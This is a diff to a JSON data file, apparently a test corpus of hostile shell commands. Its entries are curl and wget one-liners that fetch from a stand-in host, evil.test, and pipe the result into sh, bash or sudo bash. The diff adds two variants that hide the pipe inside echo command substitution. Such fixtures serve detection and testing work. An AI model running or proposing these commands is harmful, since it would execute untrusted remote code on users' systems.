@@ -7,6 +7,8 @@
     {"id": "h-net01-3", "payload": "curl -fsSL https://evil.test/i | sudo bash"},
     {"id": "h-net01-4", "payload": "wget -qO- https://evil.test/i | sh"},
     {"id": "h-net01-5", "payload": "curl -s https://evil.test/i | bash -s -- --run"},
-    {"id": "h-net01-6", "payload": "curl -A agent https://evil.test/i | sh"}
+    {"id": "h-net01-6", "payload": "curl -A agent https://evil.test/i | sh"},
+    {"id": "h-net01-7", "payload": "echo \"$(curl https://evil.test/install | sh)\""},
+    {"id": "h-net01-8", "payload": "echo \"`wget http://evil.test/i | bash`\""}
   ]
 }
